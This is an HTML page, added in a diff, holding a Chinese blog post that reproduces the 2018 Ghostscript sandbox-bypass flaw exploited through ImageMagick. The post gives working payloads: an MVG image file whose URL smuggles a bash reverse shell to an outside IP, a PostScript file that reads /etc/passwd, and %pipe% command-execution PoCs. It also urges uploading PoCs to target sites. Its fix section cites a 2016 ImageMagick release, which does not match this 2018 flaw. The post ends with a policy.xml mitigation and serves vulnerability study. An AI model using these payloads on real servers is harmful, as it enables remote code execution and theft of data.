@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="一、漏洞信息   项目 描述    漏洞名称 GhostScript 沙箱绕过（命令执行）漏洞   漏洞作者 Tavis Ormandy   CVE编号 暂未分配   漏洞描述 攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。   影响范围 &amp;lt;= 9.23（全版本，全平台）   披露时间 2018-08-21   二、复现环境">
+<meta name="keywords" content="rce">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ImageMagick安全详解">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/12/2019-1-12-ImageMagick安全详解/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="一、漏洞信息   项目 描述    漏洞名称 GhostScript 沙箱绕过（命令执行）漏洞   漏洞作者 Tavis Ormandy   CVE编号 暂未分配   漏洞描述 攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。   影响范围 &amp;lt;= 9.23（全版本，全平台）   披露时间 2018-08-21   二、复现环境">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2wnorhx2j20k90d2q6g.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2woh43y3j20k706o0ua.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.099Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ImageMagick安全详解">
+<meta name="twitter:description" content="一、漏洞信息   项目 描述    漏洞名称 GhostScript 沙箱绕过（命令执行）漏洞   漏洞作者 Tavis Ormandy   CVE编号 暂未分配   漏洞描述 攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。   影响范围 &amp;lt;= 9.23（全版本，全平台）   披露时间 2018-08-21   二、复现环境">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2wnorhx2j20k90d2q6g.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/12/2019-1-12-ImageMagick安全详解/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ImageMagick安全详解 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/12/2019-1-12-ImageMagick安全详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">ImageMagick安全详解
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-12 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-12T00:00:00+08:00">2019-01-12</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.8k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><table>
+<thead>
+<tr>
+<th align="left">项目</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞名称</td>
+<td>GhostScript 沙箱绕过（命令执行）漏洞</td>
+</tr>
+<tr>
+<td align="left">漏洞作者</td>
+<td>Tavis Ormandy</td>
+</tr>
+<tr>
+<td align="left">CVE编号</td>
+<td>暂未分配</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td>攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。</td>
+</tr>
+<tr>
+<td align="left">影响范围</td>
+<td>&lt;= 9.23（全版本，全平台）</td>
+</tr>
+<tr>
+<td align="left">披露时间</td>
+<td>2018-08-21</td>
+</tr>
+</tbody></table>
+<h2 id="二、复现环境"><a href="#二、复现环境" class="headerlink" title="二、复现环境"></a>二、复现环境</h2><ul>
+<li>OS：Ubuntu 14.10</li>
+<li>Ghostscript version：9.23（当下最新版本）</li>
+<li>Imagemagic version：7.0.8（当下最新版本）</li>
+</ul>
+<h2 id="三、环境搭建"><a href="#三、环境搭建" class="headerlink" title="三、环境搭建"></a>三、环境搭建</h2><h4 id="3-1-安装Ghostscript"><a href="#3-1-安装Ghostscript" class="headerlink" title="3.1 安装Ghostscript"></a>3.1 安装Ghostscript</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c0ny1@Ubuntu ~$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ tar zxvf ghostscript-9.23.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ <span class="built_in">cd</span> ghostscript-9.23</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ ./configure --prefix=/usr</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ mkdir obj</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ mkdir bin</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ make all</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ sudo make install</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ gs -v <span class="comment">#检查是否安装成功</span></span><br><span class="line">GPL Ghostscript 9.23 (2018-03-21)</span><br><span class="line">Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-安装Imagemagic"><a href="#3-2-安装Imagemagic" class="headerlink" title="3.2 安装Imagemagic"></a>3.2 安装Imagemagic</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ wget https://github.com/ImageMagick/ImageMagick/archive/7.0.8-9.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ tar zxvf 7.0.8-9.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ <span class="built_in">cd</span> ImageMagick-7.0.8-9/</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ ./configure --prefix=/usr</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ make</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ make install</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ sudo ldconfig /usr/<span class="built_in">local</span>/lib <span class="comment">#使用新增的动态链接库生效</span></span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ convert -version <span class="comment">#检查是否安装成功</span></span><br><span class="line">Version: ImageMagick 7.0.8-9 Q16 i686 2018-08-26 https://www.imagemagick.org</span><br><span class="line">Copyright: ? 1999-2018 ImageMagick Studio LLC</span><br><span class="line">License: https://www.imagemagick.org/script/license.php</span><br><span class="line">Features: Cipher DPC HDRI OpenMP</span><br><span class="line">Delegates (built-in):</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、漏洞验证"><a href="#四、漏洞验证" class="headerlink" title="四、漏洞验证"></a>四、漏洞验证</h2><h4 id="4-1-检测脚本"><a href="#4-1-检测脚本" class="headerlink" title="4.1 检测脚本"></a>4.1 检测脚本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ImageTragick/PoCs.git</span><br><span class="line">$ <span class="built_in">cd</span> PoCs</span><br><span class="line">$ ./test.sh</span><br></pre></td></tr></table></figure>
+
+<p>在自己服务器（此处演示为103.21.140.84）上开启监听端口7890</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -vvl 7890</span><br></pre></td></tr></table></figure>
+
+<p>将以下保存为test.jpg，上传到对应图片处理处。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|bash -i &gt;&amp; /dev/tcp/103.21.140.84/7890 0&gt;&amp;1&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+
+<p>在自己服务器（此处演示为103.21.140.84）上查看是否有反弹SHELL</p>
+<h4 id="4-2-读文件"><a href="#4-2-读文件" class="headerlink" title="4.2 读文件"></a>4.2 读文件</h4><p>读取/etc/passwd文件内容的poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/FileToSteal (/etc/passwd) def</span><br><span class="line">errordict /undefinedfilename &#123;</span><br><span class="line">    FileToSteal % save the undefined name</span><br><span class="line">&#125; put</span><br><span class="line">errordict /undefined &#123;</span><br><span class="line">    (STOLEN: ) print</span><br><span class="line">    counttomark &#123;</span><br><span class="line">        ==only</span><br><span class="line">    &#125; repeat</span><br><span class="line">    (\n) print</span><br><span class="line">    FileToSteal</span><br><span class="line">&#125; put</span><br><span class="line">errordict /invalidfileaccess &#123;</span><br><span class="line">    pop</span><br><span class="line">&#125; put</span><br><span class="line">errordict /typecheck &#123;</span><br><span class="line">    pop</span><br><span class="line">&#125; put</span><br><span class="line">FileToSteal (w) .tempfile</span><br><span class="line">statusdict</span><br><span class="line">begin</span><br><span class="line">    1 1 .setpagesize</span><br><span class="line">end</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>将以上poc保存为poc.ps文件，并执行以下命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gs -q -sDEVICE=ppmraw -dSAFER  poc.ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2wnorhx2j20k90d2q6g.jpg" alt></p>
+<h4 id="4-3命令执行"><a href="#4-3命令执行" class="headerlink" title="4.3命令执行"></a>4.3命令执行</h4><p>ubuntu poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+
+<p>centos poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+
+<p>这里我们是linux是Ubuntu发行版，故选择第一个poc进行测试。将以上poc保存为poc.jpg文件，并执行以下命令,测试对恶意图片文件进行格式转换。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/convert poc.jpg poc.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz2woh43y3j20k706o0ua.jpg" alt></p>
+<p><strong>注意：</strong> 漏洞作者的<a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">《More Ghostscript Issues: Should we disable PS coders in policy.xml by default?》</a>这篇文章里的convert命令不是ghostscript的，而是它的上游应用。可以是imagemagick，也可以是graphicsmagick。经过测试两个软件的convert命令都存在漏洞,我们这里复测的事imagemagick。</p>
+<h2 id="五、修复方式"><a href="#五、修复方式" class="headerlink" title="五、修复方式"></a>五、修复方式</h2><p>升级ImageMagick至最新的<a href="http://www.imagemagick.org/script/binary-releases.php" target="_blank" rel="noopener">2016-05-09 7.0.1-3</a>版本。</p>
+<p>如果无法快速升级，先临时做好以下两点：</p>
+<ol>
+<li>处理图片前，先检查图片的magic      bytes，也就是图片头，如果图片头不是你想要的格式，那么就不调用ImageMagick处理图片。如果你是php用户，可以使用getimagesize函数来检查图片格式，而如果你是wordpress等web应用的使用者，可以暂时卸载ImageMagick，使用php自带的gd库来处理图片。</li>
+<li>使用policy file来防御这个漏洞，这个文件默认位置在      /etc/ImageMagick/policy.xml ，我们通过配置如下的xml来禁止解析https等敏感操作：</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">policymap</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"EPHEMERAL"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"URL"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"HTTPS"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"MVG"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"MSL"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"TEXT"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"SHOW"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"WIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">policy</span> <span class="attr">domain</span>=<span class="string">"coder"</span></span></span><br><span class="line"><span class="tag"><span class="attr">rights</span>=<span class="string">"none"</span> <span class="attr">pattern</span>=<span class="string">"PLT"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">policymap</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>ghostscript的上游应用有imagemagick，libmagick，graphicsmagick，gimp，python-matplotlib，texlive-core，texmacs，latex2html，latex2rtf等，其中ImageMagick受该漏洞影响最为严重。有相当多的网站，博客，媒体平台和流行的CMS（WordPress，Drupal等）在使用ImageMagick来进行图像处理。 <strong>故在日常渗透测试中，可以上传带有dnslog测试的poc，来测试目标网站是否存在该漏洞。</strong></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/9.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/ghostscript/9.23-rce</a></li>
+<li><a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">More Ghostscript Issues: Should we disable PS coders in policy.xml by default?</a></li>
+<li><a href="http://www.cnblogs.com/ermei/p/9520184.html" target="_blank" rel="noopener">imagemaick的ghost script RCE漏洞</a></li>
+</ul>
+<p>转自：</p>
+<p><a href="http://gv7.me/articles/2018/ghostscript-rce-20180821/" target="_blank" rel="noopener">http://gv7.me/articles/2018/ghostscript-rce-20180821/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/01/12/2019-1-12-ImageMagick安全详解/" title="ImageMagick安全详解">https://wh0ale.github.io/2019/01/12/2019-1-12-ImageMagick安全详解/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/rce/" rel="tag"><i class="fa fa-tag"></i># rce</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/11/2019-1-11-soap漏洞/" rel="next" title="soap">
+                <i class="fa fa-chevron-left"></i> soap
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/13/2019-1-13-命令执行/" rel="prev" title="命令执行漏洞进阶详解">
+                命令执行漏洞进阶详解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
